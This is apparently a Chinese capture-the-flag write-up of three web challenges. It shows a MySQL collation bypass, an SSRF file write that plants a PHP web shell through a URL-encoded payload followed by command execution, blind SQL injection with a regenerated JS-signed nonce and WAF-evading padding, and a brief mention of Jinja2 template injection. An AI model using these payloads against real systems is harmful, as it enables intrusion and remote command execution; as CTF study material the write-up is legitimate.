##Look
KEY: mysql字符集校对规则
主页存在 /.viminfo文件，查看到入口
/5211ec9dde53ee65bb02225117fba1e1.php.backup~~~
<?php
$con = mysql_connect('localhost','root','');
mysql_query("set names utf8");
mysql_select_db("ctf");
if($_SERVER["REMOTE_ADDR"]=='8.8.8.8'){
    $name = addslashes($_GET['usern3me']);
}
else{
    if(stripos($_GET['usern3me'],'Bctf2O16')!==false){
        $name = 'FUCK';
    }
    else{
        $name = addslashes($_GET['usern3me']);
    }
}
echo 'hello '.$name;
$sql = "select * from admin where name='$name'";
$result = mysql_query($sql);
$num = mysql_num_rows($result);
if($num>0){
    echo '<br>next ***.php';
}
?>


查看源码得知需要查询name得到下一个入口，提示是stripos(usernmae,'Bctf2016')
所以知道了username是Bctf2016但是必须想办法绕过这个检测，再看字符集是utf-8，在mysql中utf-8的校对规则会将几个类似的字符都看做相同字符，这里用ç代替c, ?usern3me=Bçtf2016， 得到下一个入口
/c3368f5eb5f8367fd548b228bee69ef2.php
<?php
if(isset($_GET['path']) && isset($_GET['filename'])){
    $path = $_GET['path'];
    $name = "upload/".$_GET['filename'];
}
else{
    show_source(__FILE__);
    exit();
}
if(strpos($name,'..') > -1){
    echo 'WTF';
    exit();
}

if(strpos($path,'http://127.0.0.1/') === 0){
    file_put_contents($name,file_get_contents($path));
}
else{
    echo 'path error';
}
?>
从网站上找到一个文件让后写到upload目录中，文件名可以自定义
在这里利用之前的5211ec9dde53ee65bb02225117fba1e1.php可以把payload输出到页面，然后再访问这个页面得到shell
payload:
http://2cb3282d667144afa4bc6b81deedd3618eff30fd9f3348f3.ctf.game/c3368f5eb5f8367fd548b228bee69ef2.php?path=http%3A%2f%2f127.0.0.1%2f5211ec9dde53ee65bb02225117fba1e1.php%3Fusern3me%3D%3C%3Fphp%250a%24_REQUEST%5Ba%5D%28%24_REQUEST%5Bb%5D%29%3B%3F%3E&filename=2.php 
在访问/upload/2.php?a=system&b=cat ../flag_is_here.php即可得到flag


##manager
key: js，注入
一个登陆界面，试了下发现用 admin' and 可以出现两种状态，说明可以注入（用户名错误和密码错误）
直接写脚本盲注。然后发现post的内容还有一个_nonce验证码，并且这个验证码是js生成的，如果改动了username的内容，会得到illegal request回显，说明验证码和username有关
查看源码发现有一个login.js, 查看发现_nonce是随机生成的。。。然后懵逼了。
其实仔细分析应该发现，submit是button，this._nonce应该是button的属性，不会改变post的内容，所以应该发现_nonce是在另外的文件中改变的
$('#submit').click(function() {
    this._nonce = getnonce();
});
最后才知道./sources/bootstrap.js中定义了sign函数并且
$(document).ready(function() {
	$("#" + "f" + "r" + "m" + "l" + "o" + "g" + "i" + "n").submit(function(e) {
	    var z1 = $("#" + "u" + "s" + "e" + "r" + "n" + "a" + "m" + "e").val();
	    var z2 = $("#" + "p" + "a" + "s" + "s" + "w" + "o" + "r" + "d").val();
	    $('<' + 'i' + 'n' + 'p' + 'u' + 't' + '>').attr({
		    type: 'h' + 'i' + 'd' + 'd' + 'e' + 'n',
		    name: '_' + 'n' + 'o' + 'n' + 'c' + 'e',
		    value: sign(z1 + z2, "YTY" + "0Yj" + "M0Y" + "2Rh" + "ZTZ" + "iMj" + "liZ" + "jFj" + "OTQ" + "xOD" + "==")
		}).appendTo('#' + 'f' + 'r' + 'm' + 'l' + 'o' + 'g' + 'i' + 'n');
	});
});
用username和password sign,所以写注入的时候验证码要重新生成
r = requests.post(url=url,
                  data={'aaaa':'a'*200000,
                        "username":payload, 'password':'123', 'submit':'',
                        '_nonce' : sign.call('sign',payload + '123',"YTY" + "0Yj" + "M0Y" + "2Rh" + "ZTZ" + "iMj" + "liZ" + "jFj" + "OTQ" + "xOD" + "==")},
                  cookies=cookie)
另外一个坑就是ichunqiu的waf过滤了information_schema所以要加超长的填充过滤。。（找不到解释，可能和ichunqiu waf的实现有关），然后正常注入得到users表和p@ssw0rd 字段，这个字段查询的时候注意加反引号``因为@具有特殊含义会被当做系统变量符号


#fuzz
KEY: jinga2模板注入。
先fuzz出name参数。然后模板注入命令执行。具体操作见freebuf james的报告
